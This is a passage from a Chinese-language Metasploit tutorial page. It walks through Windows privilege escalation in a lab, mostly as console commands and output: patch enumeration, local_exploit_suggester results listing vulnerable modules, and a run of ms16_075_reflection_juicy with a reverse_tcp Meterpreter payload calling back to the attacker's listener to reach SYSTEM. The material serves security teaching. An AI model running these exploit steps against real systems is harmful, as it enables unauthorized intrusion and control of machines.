+<p>这里半自动化，在获取后，还是需要手动去找，这里就和手动溢出漏洞提权差不多，所以这里就演示一下。</p>
+<div class="highlight"><pre><span></span><code>msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches   ##设置半自动提权
+msf6 post(windows/gather/enum_patches) &gt; options  ##查看参数
+
+Module options (post/windows/gather/enum_patches):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(windows/gather/enum_patches) &gt; set session 2  ##设置编号，也就是刚刚上线的编号。
+session =&gt; 2
+msf6 post(windows/gather/enum_patches) &gt; run  ##开始收集
+
+[*] Running module against ADMIN-PC (192.168.10.40)
+
+Installed Patches
+=================
+
+  HotFix ID  Install Date
+  ---------  ------------
+  KB2534111  1/5/2023
+  KB976902   11/21/2010
+
+[*] Patch list saved to /root/.msf4/loot/20230316101403_default_192.168.10.40_enum_patches_978734.txt
+[*] Post module execution completed
+</code></pre></div>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/DK1LdQAzpiV2U3S.png#alt=image-20230316101445184" /></p>
+<h3 id="_39">全自动化提权操作<a class="headerlink" href="#_39" title="Permanent link">&para;</a></h3>
+<h4 id="_40">提权模块<a class="headerlink" href="#_40" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>use post/multi/recon/local_exploit_suggester 全自动：快速识别系统中可能利用的漏洞
+</code></pre></div>
+<h4 id="_41">操作设置<a class="headerlink" href="#_41" title="Permanent link">&para;</a></h4>
+<p>这里需要注意，如果出现的漏洞比较少，可以将参数SHOWDESCRIPTION，设置为true。</p>
+<div class="highlight"><pre><span></span><code>msf6 &gt; use post/multi/recon/local_exploit_suggester  ##设置全自动化提权
+msf6 post(multi/recon/local_exploit_suggester) &gt; options   ##设置参数
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2   ##设置会话编号
+session =&gt; 2
+msf6 post(multi/recon/local_exploit_suggester) &gt; run  ##开始检测
+</code></pre></div>
+<h4 id="_42">提权结果<a class="headerlink" href="#_42" title="Permanent link">&para;</a></h4>
+<p>在结果中，yes是可能存在的漏洞利用，no是没有的意思，这里我直接使用代码信息来表示吧，截图太大了。</p>
+<div class="highlight"><pre><span></span><code>msf6 post(multi/recon/local_exploit_suggester) &gt; run
+
+[*] 192.168.10.40 - Collecting local exploits for x86/windows...
+[*] 192.168.10.40 - 174 exploit checks are being tried...
+[+] 192.168.10.40 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 192.168.10.40 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 192.168.10.40 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
+[+] 192.168.10.40 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 192.168.10.40 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 192.168.10.40 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 192.168.10.40 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 192.168.10.40 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 192.168.10.40 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[+] 192.168.10.40 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+[*] Running check method for exploit 41 / 41
+[*] 192.168.10.40 - Valid modules for session 2:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/ikeext_service                           Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+ 10  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+ 11  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
+ 12  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+ 13  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+ 14  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
+ 15  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
+ 16  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
+ 17  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
+ 18  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
+ 19  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
+ 20  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
+ 21  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
+ 22  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
+ 23  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
+ 24  exploit/windows/local/ipass_launch_app                         No                       The target is not exploitable.
+ 25  exploit/windows/local/lenovo_systemupdate                      No                       The target is not exploitable.
+ 26  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
+ 27  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
+ 28  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
+ 29  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
+ 30  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
+ 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
+ 32  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.
+ 33  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
+ 34  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
+ 35  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
+ 36  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
+ 37  exploit/windows/local/ntapphelpcachecontrol                    No                       The target is not exploitable.
+ 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
+ 39  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
+ 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
+ 41  exploit/windows/local/webexec                                  No                       The target is not exploitable.
+
+[*] Post module execution completed
+</code></pre></div>
+<h4 id="_43">执行提权<a class="headerlink" href="#_43" title="Permanent link">&para;</a></h4>
+<p>注意这里我之前的操作都是使用Windows7来提权的，不过演示过程中，发现无法提权，后来到这里的时候切换为Windows2012了，这里需要注意，也间接性表面，提权的困难。</p>
+<p>这里选择上面yes的模块，并进行设置模块，然后设置相关参数，这里仔细看，首先设置session，这个就是之前msf上线的编号，然后后面可以看到我将端口设置为6666，其实这里，有时候会出现命令执行成功了，但是并不能反弹会话窗口，那么这里我就重新设置了一个监听，来监听返回的端口。</p>
+<div class="highlight"><pre><span></span><code>msf6 post(multi/recon/local_exploit_suggester)&gt; use exploit/windows/local/ms16_075_reflection_juicy
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; options 
+
+Module options (exploit/windows/local/ms16_075_reflection_juicy):
+
+   Name     Current Setting                         Required  Description
+   ----     ---------------                         --------  -----------
+   CLSID    {4991d34b-80a1-4291-83b6-3328366b9097}  yes       Set CLSID value of the DCOM to trigger
+   SESSION                                          yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  none             yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     192.168.10.20    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set session 3
+session =&gt; 3
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set lport 6666
+lport =&gt; 6666
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; run
+
+[-] Handler failed to bind to 192.168.10.20:6666:-  -
+[-] Handler failed to bind to 0.0.0.0:6666:-  -
+[+] Target appears to be vulnerable (Windows 2012 R2 (6.3 Build 9600).)
+[*] Launching notepad to host the exploit...
+[+] Process 1404 launched.
+[*] Reflectively injecting the exploit DLL into 1404...
+[*] Injecting exploit into 1404...
+[*] Exploit injected. Injecting exploit configuration into 1404...
+[*] Configuration injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt;
+</code></pre></div>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/8TmHN2l6JBIXvQV.png#alt=image-20230316111033982" /></p>
+<h4 id="_44">返回端口<a class="headerlink" href="#_44" title="Permanent link">&para;</a></h4>
+<p>设置监听端口，应该不需要重新演示一边了吧，这里就看效果吧！</p>
+<p>可以看到这里已经成功获取system权限了。</p>
+<p><img alt="" src="https://s2.loli.net/2023/03/16/MyVxDRslunBjdIA.png#alt=image-20230316115858577" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.8fd75fb4.min.js"></script>
+      
+    
+  </body>
+</html>
